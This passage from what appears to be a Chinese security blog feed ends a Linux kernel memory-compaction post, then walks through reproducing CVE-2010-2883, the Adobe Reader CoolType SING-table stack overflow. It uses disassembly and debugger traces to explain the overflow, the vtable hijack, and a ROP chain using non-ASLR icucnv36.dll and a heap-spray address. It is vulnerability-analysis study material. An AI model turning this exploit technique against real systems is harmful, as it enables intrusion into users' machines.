compaction_defer_reset(zone, order, true);  count_vm_event(COMPACTSUCCESS);  return page; &#125;  count_vm_event(COMPACTFAIL);  cond_resched();  return NULL;&#125;</code></pre><p>这里的函数也是迁移算法<code>memory compaction</code>的代码实现，该算法可以简化为下面的流程</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/242dd42a2834349b34c1834c8cea15ce37d3be30.jpg"></p><p>也就是分为两个链表，一个专门遍历空闲页，一个专门遍历使用页，注意这俩要分别维持链表，然后最后进行交换操作就实现了迁移过程，且记住这个迁移是需要<code>page</code>本身是允许的才行,</p><p>在完成上述迁移操作后会再次尝试快速分配，这里的碎片化整理还有其他方式，但是我这里暂不区深究，先记录个图等我哪天想起来了再探索</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/e4dde71190ef76c6cae717e2d816fdfaae5167c6.jpg"></p><p>而关于慢速分配还有个函数是<code>__alloc_pages_direct_reclaim()</code>，他的作用主要是回收，而不是碎片整理</p><p>最后来个整体分配页框的函数流程图<br><img src="http://imgsrc.baidu.com/forum/pic/item/810a19d8bc3eb135a3e35b72e31ea8d3fc1f44d7.jpg"></p><h2 id="1-参考"><a href="#1-参考" class="headerlink" title="-1.参考"></a>-1.参考</h2><p><a href="http://arttnba3.cn/">arttnba3师傅博客</a></p><p><a href="https://www.kernel.org/">kernel doc 中文版</a></p><p><a href="https://kernelnewbies.org/">kernel new bies</a></p><p><a href="https://lwn.net/">LWN</a></p>]]></content>
    
    
    <categories>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>kernel</tag>
      
      <tag>source</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2010-2883漏洞复现</title>
    <link href="/2023/06/17/CVE-2010-2883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/06/17/CVE-2010-2883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-2883漏洞复现"><a href="#CVE-2010-2883漏洞复现" class="headerlink" title="CVE-2010-2883漏洞复现"></a>CVE-2010-2883漏洞复现</h1><h2 id="1-所需环境"><a href="#1-所需环境" class="headerlink" title="1.所需环境"></a>1.所需环境</h2><ul><li>受害者所处操作系统：Windows XP SP3(MSDN版)</li><li>虚拟机：VMware workstation</li><li>动态调试：吾爱OllyDbg</li><li>静态调试：IDA pro</li><li>漏洞软件：Adobe Reader(版本号-9.3.4)</li></ul><h2 id="2-漏洞描述"><a href="#2-漏洞描述" class="headerlink" title="2.漏洞描述"></a>2.漏洞描述</h2><p>该漏洞是利用Adobe Reader 和 Acrobat中<code>CoolType.dll</code>库在解析字体文件SING表中存在的栈溢出漏洞，导致的结果就是当用户打开了特制的PDF文件后就可能导致任意代码执行</p><h2 id="3-基础知识们"><a href="#3-基础知识们" class="headerlink" title="3.基础知识们"></a>3.基础知识们</h2><p>本次漏洞是在PDF当中，因此我们需要线了解以下pdf文档的格式，以及其中关键点ttf sing表的格式，首先pdf的格式，下面是盗的图（</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5992036/v2yp86lax8.png?imageView2/2/w/2560/h/7000"></p><p><img src="https://ask.qcloudimg.com/http-save/yehe-5992036/51k8v42nbp.jpeg?imageView2/2/w/2560/h/7000"></p><ul><li>Header :头部，用来注明版本号</li><li>Body：主体，图片、文字等</li><li>xref tale：交叉引用表，存放所有对象的偏移</li><li>Trailer：文件尾部，以%%EOF结尾</li></ul><p>而ttf文件就是pdf中的字体文件，而TTF中关于SING表的数据结构体TableEntry的结构如下：</p><pre><code class="hljs">typedef struct_SING&#123;    char tag[4]; //标记&quot;SING&quot;    ULONG checkSum;//校验和：0xD9BCC8B5    ULONG offset; //相对文件的偏移：0x0000011C    ULONG length;//数据长度：0x00001DDF&#125;TableEntry;</code></pre><p>而上面是一个定位SING表的引子，接下来是SING表的整体结构<br><img src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e71c003ed4fc389b504ec26a0f.jpg"></p><p>具体数据结构如下：</p><pre><code class="hljs">#ifndef FORMAT_SING_H#define FORMAT_SING_H#define SING_VERSION VERSION(1, 1)#define SING_UNIQUENAMELEN 28#define SING_MD5LEN 16typedef struct&#123;Card16 tableVersionMajor;//Card16,两字节Card16 tableVersionMinor;Card16 glyphletVersion;Card16 permissions;Card16 mainGID;Card16 unitsPerEm;Int16 vertAdvance;Int16 vertOrigin;Card8 uniqueName[SING_UNIQUENAMELEN];Card8 METAMD5[SING_MD5LEN];Card8 nameLength;Card8 *baseGlyphName; /* name array */&#125; SINGTbl;</code></pre><h2 id="4-发现漏洞点"><a href="#4-发现漏洞点" class="headerlink" title="4.发现漏洞点"></a>4.发现漏洞点</h2><p>首先我们找到位于Adobe文件路径下的动态库<br><img src="http://imgsrc.baidu.com/forum/pic/item/32fa828ba61ea8d3a10a50ced20a304e241f58cb.jpg"><br>我们打开IDA，分析<code>CoolType.dll</code>库，查看字符串表<code>SING</code>，然后查看交叉引用，这里若是使用F12找的字符串可能会出问题，因此我们使用ALT + T 组合键来寻找<code>SING</code></p><pre><code class="hljs">text:0803DCF9                               ; __unwind &#123; // loc_8184A54.text:0803DCF9 55                            push    ebp.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4].text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie.text:0803DD09 33 C5                         xor     eax, ebp.text:0803DD0B 89 85 04 01 00 00             mov     [ebp+108h+var_4], eax.text:0803DD11 6A 4C                         push    4Ch.text:0803DD13 B8 54 4A 18 08                mov     eax, offset loc_8184A54.text:0803DD18 E8 B4 A4 00 00                call    __EH_prolog3_catch.text:0803DD18.text:0803DD1D 8B 85 1C 01 00 00             mov     eax, [ebp+108h+arg_C].text:0803DD23 8B BD 10 01 00 00             mov     edi, [ebp+108h+arg_0].text:0803DD29 8B 9D 14 01 00 00             mov     ebx, [ebp+108h+arg_4].text:0803DD2F 89 7D D8                      mov     [ebp+108h+var_130], edi.text:0803DD32 89 45 D0                      mov     [ebp+108h+var_138], eax.text:0803DD35 E8 F2 39 00 00                call    sub_804172C.text:0803DD35.text:0803DD3A 33 F6                         xor     esi, esi                        ; esi清0，之后用于判断值是否为空.text:0803DD3C 83 7F 08 03                   cmp     dword ptr [edi+8], 3.text:0803DD3C.text:0803DD40                               ;   try &#123;.text:0803DD40 89 75 FC                      mov     [ebp+108h+var_10C], esi.text:0803DD43 0F 84 B7 01 00 00             jz      loc_803DF00.text:0803DD43.text:0803DD49 89 75 E4                      mov     [ebp+108h+var_124], esi.text:0803DD4C 89 75 E8                      mov     [ebp+108h+var_120], esi.text:0803DD4F 83 7F 0C 01                   cmp     dword ptr [edi+0Ch], 1.text:0803DD4F                               ;   &#125; // starts at 803DD40.text:0803DD4F.text:0803DD53                               ;   try &#123;.text:0803DD53 C6 45 FC 01                   mov     byte ptr [ebp+108h+var_10C], 1.text:0803DD57 0F 85 4C 01 00 00             jnz     loc_803DEA9.text:0803DD57.text:0803DD5D 68 2C DB 19 08                push    offset aName                    ; &quot;name&quot;.text:0803DD62 57                            push    edi                             ; int.text:0803DD63 8D 4D E4                      lea     ecx, [ebp+108h+var_124].text:0803DD66 C6 45 EF 00                   mov     [ebp+108h+var_119], 0.text:0803DD6A E8 68 3A FE FF                call    sub_80217D7.text:0803DD6A.text:0803DD6F 39 75 E4                      cmp     [ebp+108h+var_124], esi.text:0803DD72 75 69                         jnz     short loc_803DDDD.text:0803DD72.text:0803DD74 68 4C DB 19 08                push    offset aSing                    ; &quot;SING&quot;.text:0803DD79 57                            push    edi                             ; int.text:0803DD7A 8D 4D DC                      lea     ecx, [ebp+108h+var_12C]         ; 指向SING表入口.text:0803DD7D E8 84 3D FE FF                call    sub_8021B06                     ; 处理SING表.text:0803DD7D.text:0803DD82 8B 45 DC                      mov     eax, [ebp+108h+var_12C]         ; SING表入口赋值给eax.text:0803DD85 3B C6                         cmp     eax, esi                        ; 判断表入口是否位空.text:0803DD85                               ;   &#125; // starts at 803DD53.text:0803DD85.text:0803DD87                               ;   try &#123;.text:0803DD87 C6 45 FC 02                   mov     byte ptr [ebp+108h+var_10C], 2.text:0803DD8B 74 37                         jz      short loc_803DDC4               ; 若我们处理的SING表不出差错，这里是不会进行跳转的.text:0803DD8B.text:0803DD8D 8B 08                         mov     ecx, [eax]                      ; 这里传入的是SING表的第一个四字节，这里是1.0版本，也就是00 01 00 00.text:0803DD8F 81 E1 FF FF 00 00             and     ecx, 0FFFFh                     ; 这里进行判断想与，会设置对应eflags标志位.text:0803DD95 74 08                         jz      short loc_803DD9F               ; 由于上一步设置了相应标志位，因此在这里跳转.text:0803DD95.text:0803DD97 81 F9 00 01 00 00             cmp     ecx, 100h.text:0803DD9D 75 21                         jnz     short loc_803DDC0.text:0803DD9D.text:0803DD9F.text:0803DD9F                               loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j.text:0803DD9F 83 C0 10                      add     eax, 10h                        ; eax本来是存放SING表首地址，这里加上0x10偏移指向uniqueName.text:0803DD9F                                                                       ; uniqueName域.text:0803DDA2 50                            push    eax                             ; Source.text:0803DDA3 8D 45 00                      lea     eax, [ebp+108h+Destination]     ; Destination是-0x108,所以这里应该就是普通的lea eax,[ebp].text:0803DDA6 50                            push    eax                             ; Destination.text:0803DDA7 C6 45 00 00                   mov     [ebp+108h+Destination], 0.text:0803DDAB E8 48 3D 13 00                call    strcat                          ; 漏洞点</code></pre><h2 id="5-样本分析（阶段一：栈溢出）"><a href="#5-样本分析（阶段一：栈溢出）" class="headerlink" title="5.样本分析（阶段一：栈溢出）"></a>5.样本分析（阶段一：栈溢出）</h2><p>我们首先获取到对应样本，其为一个pdf，当我们打开此pdf会有个任意命令执行的功能，具体呈现出的效果为打开一个计算器，如下：<br><img src="http://imgsrc.baidu.com/forum/pic/item/6609c93d70cf3bc7f8d2ec269400baa1cc112a2d.jpg"></p><p>然后执行他，会出现一个明显的pdf弹框，但不完全，接下来就会出现计算器<br><img src="http://imgsrc.baidu.com/forum/pic/item/c9fcc3cec3fdfc03e1b7c272913f8794a5c22628.jpg"></p><p>当然也可以是别的命令，这里仅仅是为了体现效果<br>首先我们打开OD，加载Adobe文件下的AcroRd32可执行文件</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c8c771dded3a3e6709c83d5135.jpg"></p><p>然后我们按下F9来运行程序，这样可以用来加载我们需要的库<br>这里我们先配合之前的IDA静态分析的结果，我们利用ctrl + g进行地址跟踪，然后双击十六进制部分进行断点，至于下断点的位置，有以下三个点，</p><ul><li>首先就是我们讲<code>SING</code>表赋值给eax的那个点(0x803dd82)；</li><li>然后就是执行strcat函数的点(0x803ddab)</li><li>最后就是一个关键漏洞点(0x808b308)，这个点我们之后详细介绍</li></ul><p>此时我们使用OD打开的Adobe Reader打开样本Exploit，然后会断到我们的第三个断电处</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c336800fe025f4c510fd8f9a1fb.jpg"></p><p>该指令是执行eax寄存器保存的地址指向的函数，这里我们可以从右上角的Registers窗口看到eax的值，发现他是在栈上的，此时我们右键点击eax，然后选择Follow in Stack，这样我们的栈窗口看到咱们eax中保存的值所指向的地址是0x80833EF,此刻我们返回IDA，查看该地址所在的函数</p><pre><code class="hljs">size_t *__cdecl sub_80833EF(int a1, int a2, void *a3, size_t *a4)&#123;  size_t *result; // eax  switch ( a2 )  &#123;    case 0:      return (size_t *)sub_8083119(a3, *a4);    case 2:      return (size_t *)sub_80830AE(*a4);    case 3:      result = (size_t *)sub_80828ED(*(_DWORD *)(a1 + 4), 0);      *a4 = (size_t)result;      break;    default:      result = a4;      *a4 = 0;      break;  &#125;  return result;&#125;</code></pre><p>观察这里是一个switch选择语句，看别的师傅博客是说明这里是处理SING表的时候会执行的函数，具体情况我们到下面再来讲解<br>接下来我们再次F9，类似于gdb当中的c，这里会到达我们之前下的第一个断点，这条指令会将我们SING表的首地址传入eax，我们F8单步执行到下一条指令来查看以下EAX的值<br><img src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343f388a7ebd613b07ecb8088b0.jpg"><br>此时我们查看eax指向地址的值，首先右键eax，然后选择follow in dump，接着会再二进制窗口显示我们值指向的地址，这里从我们之前了解到的<code>SING</code>表结构会知道uniquename的地址应该是SING表偏移0x10字节的地方，也就是0x035529a0,可以看到样本中uniqueName字段十分长，然后我们单步执行到<code>push eax</code>，这里是将我们的uniqueName字段的地址压栈</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/b2de9c82d158ccbf231c95f05cd8bc3eb0354153.jpg"></p><p>然后我们再次F9运行到第二个断点处，这里即将调用strcat函数，可以看到其目的地址已经在栈上了，目的地址也是指向栈上的一个缓冲区地址，此时我们查看一下目前的目的地址附近的值，我们在栈窗口上ctrl+g，然后输入目的地址0x12e468</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8b82b9014a90f603d830bc8d7c12b31bb151ed7c.jpg"></p><p>然后我们单步F8步过call strcat指令，由于我们没有对uniquename进行长度检查，这就导致了我们现如今会将其全部拷贝到栈上指定的地址，结果如下</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/00e93901213fb80e5f23411d73d12f2eb838940d.jpg"></p><p>可以看到我们左边uniqueName字段的值已经赋值到右边栈上0x12e4d8这里了，此时我们再来查看之前0x12E6D0,此时可以看到已经被覆盖为我们所伪造的地址了</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9b8d9e2ef61c8701a08bfb3d.jpg"></p><p>此时我们可以看到旁边注释也是很清楚，返回到icucnv36.4A80CB38，此时我们跳转到该地址来查看一下函数是干啥的，以及我们为啥要修改之前的返回地址为他</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/6a600c338744ebf8ea5d47f59cf9d72a6159a7c8.jpg"></p><p>根据别的师傅的说法，这里是明显的利用ROP绕过DEP保护的手段，但是由于本人太菜不了解，所以下面来科普一下相关知识</p><hr><h3 id="1-GS保护"><a href="#1-GS保护" class="headerlink" title="1.GS保护"></a>1.GS保护</h3><p>类似于linux上的canary,函数执行前存放在返回值与ebp上（低地址），然后当我们程序执行完毕之后会调用检查函数来判断该值是否与之前相同，因此我们此时就不能通过覆盖ret地址进行ROP链构造了，而是修改栈上保存的某一个函数指针来进行利用</p><p>IDA反汇编可以看到函数开始前会有如下指令：</p><pre><code class="hljs">text:0803DCF9                               ; __unwind &#123; // loc_8184A54.text:0803DCF9 55                            push    ebp.text:0803DCFA 81 EC 04 01 00 00             sub     esp, 104h                       ; esp开拓栈空间0x104.text:0803DD00 8D 6C 24 FC                   lea     ebp, [esp-4].text:0803DD04 A1 B8 0F 23 08                mov     eax, ___security_cookie.text:0803DD09 33 C5                         xor     eax, ebp</code></pre><p>结束函数的时候有以下判断</p><pre><code class="hljs">.text:0803DEE1 E8 A9 A2 00 00                call    @__security_check_cookie@4      ; __security_check_cookie(x).text:0803DEE1.text:0803DEE6 81 C5 08 01 00 00             add     ebp, 108h.text:0803DEEC C9                            leave.text:0803DEED C3                            retn</code></pre><h3 id="2-DEP-Data-Excution-Prevention-数据执行保护"><a href="#2-DEP-Data-Excution-Prevention-数据执行保护" class="headerlink" title="2.DEP(Data Excution Prevention)数据执行保护"></a>2.DEP(Data Excution Prevention)数据执行保护</h3><p>类似于Linux上的NX，不知道为啥名字这俩起不一样干嘛，搞得我是新知识点了，艹。所以这里我们可以使用ROP来进行栈迁移进行绕过，我们可以再OD上输入指令alt+m来查看内存情况，类似pwndbg中的vmmap，十分方便（这里插一句我个人还是更喜欢gdb，不知道为啥就对Linux的喜爱更甚Windows）</p><h3 id="3-ALSR"><a href="#3-ALSR" class="headerlink" title="3.ALSR"></a>3.ALSR</h3><p>终于来了个名字一样的了，在加载程序的时候不再使用固定的基址加载，支持ASLR的程序在其PE头中会设置<br><code>IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE</code>标识来说明其支持ASLR。例如，如果 icucnv36.dll 开启了 ASLR，那么同一个代码的地址，可能是 0x4A80CB38，也可能是 0x5A80CB38。由于无法知道准确的地址，所以也就无法跳转到想要执行的代码。我们可以通过下面这个小工具来查看对应库中是否开启了ALSR</p><p><a href="http://www.scriptjunkie.us/files/pefinder.zip">http://www.scriptjunkie.us/files/pefinder.zip</a></p><p>用法如下</p><pre><code class="hljs">dir /b /w /s &quot;C:\Program Files\Adobe\*.dll&quot; | pefinder.exe -</code></pre><p>我们之前将对应0x12E6D0的栈地址指向的即将修改的函数指针改成0x4A80CB38,他位于icucnv36下，我们挑选他不是没有理由，因此我们打开cmd执行上述命令来查看哪里没开ALSR,我们可以找到如下信息：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/63d0f703918fa0ecdc5e47c7639759ee3c6ddb5b.jpg"></p><p>而具体绕过是通过堆喷，我们再之后再来介绍</p><hr><p>我们介绍了几个涉及到的保护知识，接下来再继续分析，我们来说上面所打的第三个断点，我们是如何发现该点的呢，这是通过一步一步调试获取所得，所以上面相当于是提前知道这里用来方便理解<br>这里因为我们要执行恶意代码，运行一次恶意代码会影响后续的工作，因此我们此时先保存个虚拟机快照了再接着调试</p><p>我们F8单步到call CoolType.08001243处，下一个断点，然后再次单步步过<br><img src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffcbbc69c78fc014a90f703ea08.jpg"></p><p>发现并没有出现什么问题，此时我们取消上面打的断点，再接下来单步调试，最后单步我们会到达之前的第三个断点处，如下图:</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d009b3de9c82d15881557a7bc50a19d8bd3e4220.jpg"></p><p>理论上如果你填充大量无关数据，是可以找到这条关键漏洞的地址值的，上面图中我也贴心的给出了eax里面保存的函数指针，这里可以看到接下来就会调用上面的0x4A80CB38的汇编指令了</p><p>这里我们重新来看看，为啥跳转到了这个call [eax]指令，我们首先ctrl + F2来重新启动程序，按照之前的步骤我们步到这里，如下图</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16cfd1b8abb6deb48f8d5464e1.jpg"></p><p>此时这条指令<code>call CoolType.08016BDE</code>执行后就会跳转到<code>call [eax]</code>,但这是为什么呢，我们步入进去看看，使用F7，进入该函数后，再此单步调试，直到下面这条指令</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/7c1ed21b0ef41bd5d455ca3e14da81cb38db3df1.jpg"></p><p>执行该call后会跳到<code>call [eax]</code>,但是这又是为啥呢，因此我们再F7跟进看看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d01373f082025aaf30455c01beedab64024f1a80.jpg"></p><p>可以看到这就是函数内部了，上面重点标记的指令将ecx的值赋给了eax，我们查看ecx</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/fc1f4134970a304e7f7a823094c8a786c8175c9b.jpg"></p><p>我们可以跟之前一样右键ecx然后选择follow in dump ，然后左下角二进制会出现相应值，我们发现ecx值所指向的是0x081A601C</p><p>我们可以通过右键二进制窗口，选择long–&gt;address，来方便我们用地址形式来查看内存数据，此时我们跳转到0x81A601C看看这里存放的是什么</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/203fb80e7bec54e712a338d4fc389b504ec26aa8.jpg"></p><p>可以发现这里存放的很多函数指针，因此不难判断上面的函数地址这是一个虚表指针，我们可以到IDA中查看该虚表内容</p><pre><code class="hljs">.rdata:081A6004 53 74 72 65 61 6D 48 61 6E 64+aStreamhandler db &#39;StreamHandler&#39;,0     ; DATA XREF: .data:off_821D31C↓o.rdata:081A6012 00 00 00 00 00 00             align 8.rdata:081A6018 2C 87 1E 08                   dd offset ??_R4StreamHandler@@6B@       ; const StreamHandler::`RTTI Complete Object Locator&#39;.rdata:081A601C                               ; const StreamHandler::`vftable&#39;.rdata:081A601C 16 B1 08 08                   ??_7StreamHandler@@6B@ dd offset sub_808B116.rdata:081A601C                                                                       ; DATA XREF: sub_801E529-18↑o.rdata:081A601C                                                                       ; sub_808AC54+11↑o.rdata:081A6020 AA B5 08 08                   dd offset sub_808B5AA.rdata:081A6024 62 99 08 08                   dd offset sub_8089962.rdata:081A6028 8C 95 08 08                   dd offset sub_808958C.rdata:081A602C 91 95 08 08                   dd offset nullsub_41.rdata:081A6030 AA B0 08 08                   dd offset nullsub_47.rdata:081A6034 85 AC 08 08                   dd offset sub_808AC85.rdata:081A6038 C7 95 08 08                   dd offset nullsub_37.rdata:081A603C 95 B0 08 08                   dd offset sub_808B095.rdata:081A6040 07 9E 08 08                   dd offset sub_8089E07.rdata:081A6044 6F 99 08 08                   dd offset sub_808996F.rdata:081A6048 A7 94 08 08                   dd offset sub_80894A7.rdata:081A604C ED 95 08 08                   dd offset sub_80895ED.rdata:081A6050 F2 95 08 08                   dd offset sub_80895F2.rdata:081A6054 C5 B0 08 08                   dd offset sub_808B0C5.rdata:081A6058 FC E4 01 08                   dd offset nullsub_48.rdata:081A605C F9 E4 01 08                   dd offset nullsub_49.rdata:081A6060 FF E4 01 08                   dd offset sub_801E4FF.rdata:081A6064 DA 94 08 08                   dd offset sub_80894DA.rdata:081A6068 F7 95 08 08                   dd offset sub_80895F7.rdata:081A606C F8 E4 01 08                   dd offset nullsub_50.rdata:081A6070 04 E5 01 08                   dd offset sub_801E504.rdata:081A6074 70 B0 08 08                   dd offset sub_808B070.rdata:081A6078 8A AC 08 08                   dd offset sub_808AC8A.rdata:081A607C 2F 99 08 08                   dd offset sub_808992F.rdata:081A6080 5B C3 01 08                   dd offset sub_801C35B.rdata:081A6084 34 99 08 08                   dd offset sub_8089934.rdata:081A6088 9B B5 08 08                   dd offset sub_808B59B.rdata:081A608C 37 99 08 08                   dd offset sub_8089937.rdata:081A6090 69 99 08 08                   dd offset nullsub_46.rdata:081A6094 45 9E 08 08                   dd offset sub_8089E45.rdata:081A6098 54 DC 01 08                   dd offset sub_801DC54.rdata:081A609C 45 DF 01 08                   dd offset sub_801DF45.rdata:081A60A0 F0 D5 01 08                   dd offset sub_801D5F0.rdata:081A60A4 0E C3 01 08                   dd offset sub_801C30E.rdata:081A60A8 3B C3 01 08                   dd offset sub_801C33B.rdata:081A60AC 4B C3 01 08                   dd offset sub_801C34B.rdata:081A60B0 1F 99 08 08                   dd offset sub_808991F.rdata:081A60B4 54 59 50 31 00                aTyp1 db &#39;TYP1&#39;,0                       ; DATA XREF: sub_808B116+275↑o</code></pre><p>可以看到此虚表类型为StreamHandler，应该是处理PDF中流对象的类，然后我们查看IDA中目前正在执行的语句（通过OD来看）</p><pre><code class="hljs">.text:0801BB21 55                            push    ebp.text:0801BB22 8B EC                         mov     ebp, esp.text:0801BB24 FF 75 20                      push    [ebp+arg_18].text:0801BB27 8B 4D 08                      mov     ecx, [ebp+StreamHandler].text:0801BB2A FF 75 1C                      push    [ebp+arg_14].text:0801BB2D 8B 01                         mov     eax, [ecx].text:0801BB2F FF 75 18                      push    [ebp+arg_10].text:0801BB32 FF 05 A0 A6 23 08             inc     dword_823A6A0.text:0801BB38 FF 75 14                      push    [ebp+arg_C].text:0801BB3B FF 75 10                      push    [ebp+arg_8].text:0801BB3E FF 75 0C                      push    [ebp+arg_4].text:0801BB41 FF 10                         call    dword ptr [eax]</code></pre><p>IDA 上面一段代码反汇编情况如下：</p><pre><code class="hljs">int __cdecl sub_801BB21(        int (__thiscall ***StreamHandler)(_DWORD, int, int, int, int, int, int),        int a2,        int a3,        int a4,        int a5,        int a6,        int a7)&#123;  int (__thiscall **v7)(_DWORD, int, int, int, int, int, int); // eax  int result; // eax  v7 = *StreamHandler;  ++dword_823A6A0;  result = (*v7)(StreamHandler, a2, a3, a4, a5, a6, a7);  if ( !(_BYTE)result )    --dword_823A6A0;  return result;&#125;</code></pre><p>可以看到该代码段是传递7个参数，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/94cad1c8a786c91721047ff38c3d70cf3ac757f0.jpg"></p><p>可以看到栈上第一个参数就是之前我们ecx保存的值，该值是一个指向一个虚表指针的地址，也就是我们的StreamHandler对象，该代码逆向的大致含义就是运行虚函数指向的第一个函数，也就是0x0808B116,然后其第一个对象就是StreamHandler,我们可以查看该地址二进制附近的数值</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/9d82d158ccbf6c81cd6e0122f93eb13532fa409a.jpg"></p><p>可以看到在当初覆盖值的时候，我们会在此处也覆盖掉一个值，这里也就出现了我们一开始的0x12E6D0,也就是之后call [eax]的eax值，此时我们再次OD F7步入0x808B116,然后单步步过</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/279759ee3d6d55fb6a8c5bec28224f4a21a4ddb6.jpg"></p><p>然后到达这条语句，可以看到是将edi + 0x3c地址指向的值赋给了eax，而这个edi保存的是之前StreamHandler对象的首地址，加上0x3c就变成了刚刚我们说里面保存0x12E6D0的值，此时这条指令执行完毕，eax中就是该值了，再然后我们单步，你会发现：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/3b87e950352ac65c13bc4bb9bef2b21192138aba.jpg"></p><p>哦我的老天爷，这不是咱们之前打的3号断点嘛，这下我们终于知道了为什么最后call eax会是这个值了，然后我们回到断点处，这里我们会调用0x4A80CB38这个函数，我们按下F7进入该函数查看，至此溢出部分分析完毕</p><h2 id="5-样本分析（阶段二：ROP链）"><a href="#5-样本分析（阶段二：ROP链）" class="headerlink" title="5.样本分析（阶段二：ROP链）"></a>5.样本分析（阶段二：ROP链）</h2><p>接着上面继续分析，我们现在运行到了icucnv36.dll中0x4A80CB38这个地址的函数，我们进入查看</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fc7e9bf81fafa40f4afb054c.jpg"></p><p>这里我们看到是首先将ebp抬了0x794字节（栈从高到低扩展），然后执行leave，熟悉栈迁移的同学可能十分了解他，它实际上的操作相当于<code>mov esp ebp; pop ebp;</code><br>此时指令执行完毕，栈顶应该指向0x0012E4E0（EBP + 0x794 + 4 &#x3D; 0x12DD48 + 0x794 + 4）,下面发现果真如此，然后栈顶指向的指针就会被我们的retn指令调用</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/8718367adab44aed9fc5922ef61c8701a08bfb75.jpg"></p><p>此时可一看到下一条指令我们是执行 0x4A82A714,我们继续跟进，发现这里是简单的pop出栈上的值到达esp，相当于是再次栈迁移了，这里我们之前构造的0x0C0C0C0C是我们常用的堆喷地址，在后面我们会介绍堆喷的原理，目前程序运行情况如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/50da81cb39dbb6fd2f88c9ec4c24ab18962b372c.jpg"></p><p>执行后，栈迁移到0x0c0c0c0c</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/2cf5e0fe9925bc31609b2d521bdf8db1ca137031.jpg"></p><p>然后继续跟进，发现是将0x4A8A0000弹到ecx上，继续跟进，没什么好说的，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/c2cec3fdfc039245b8b3cec5c294a4c27c1e25f1.jpg"></p><p>发现是保存eax到刚刚赋值ecx的地址那儿，也就是0x4A8A0000，然后上面的函数ret过后，会再次从栈上弹出值到eax当中</p><pre><code class="hljs">4A801F90    58              pop eax                           ; &lt;&amp;KERNEL32.CreateFileA&gt;4A801F91    C3              retn4A801F92    33C0            xor eax,eax4A801F94    C3              retn4A801F95 &gt;  8B4C24 04       mov ecx,dword ptr ss:[esp+0x4]    ; icucnv36.4A80B6924A801F99    85C9            test ecx,ecx                      ; icucnv36.4A8A0000</code></pre><p>这里弹出的值是<CreateFileA>的符号值，然后我们进入retn，发现是</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/77c6a7efce1b9d16d2b1b5abb6deb48f8d546481.jpg"></p><p>然后我们就是直接jmp [eax]，也就是直接执行<code>kernel32.CreateFileA</code>这个函数，并且此时我们在栈上也已经构造好了参数如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb13090813d99854564e93584b92.jpg"></p><p>此时我们步入这个函数查看内部实现情况</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/54fbb2fb43166d2296323a5e032309f79152d2b7.jpg"></p><p>我们移步到右下角这是咱们解析的参数，这个<code>CreateFileA</code>函数的功能是打开某个文件，如果没这个文件就会创建，其名为<code>iso88591</code>,此时我们使用ctrl + F9来执行到返回，然后查看是否创建出了这个文件，他会被创建在桌面上</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/f2deb48f8c5494eec5de20d368f5e0fe98257e7f.jpg"></p><p>可以看到我标注的那个文件，确实是<code>iso88591</code>,这里注意如果你windows的隐藏文件夹选项开着那就看不到，记得到控制面板设置一下</p><p>之后我们继续调试，刚刚我们已经返回，如下：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/d833c895d143ad4b5cdc690ac7025aafa50f060d.jpg"></p><p>此时eax应该是上面函数的返回值，其为我们刚刚创建的文件句柄，也就是0x33c，然后交换eax和edi，再次步入</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/622762d0f703918f6e9f1300143d269758eec4aa.jpg"></p><p>此时我们会将栈上的8弹给ebx，接着步入</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/80cb39dbb6fd5266ac6c12deee18972bd50736b0.jpg"></p><p>可以看到上面的图中我们将edi,也就是之前的文件句柄传给了esp + ebp*2的地址，可以看到ebx为刚刚的8，也就是距离栈顶偏移0x10字节，也就是将0x0c0c0c6c上原来的值0xFFFFFFFF改为文件句柄，也就是0x33c,然后我们ctrl+F9跳转到返回前</p><p><img 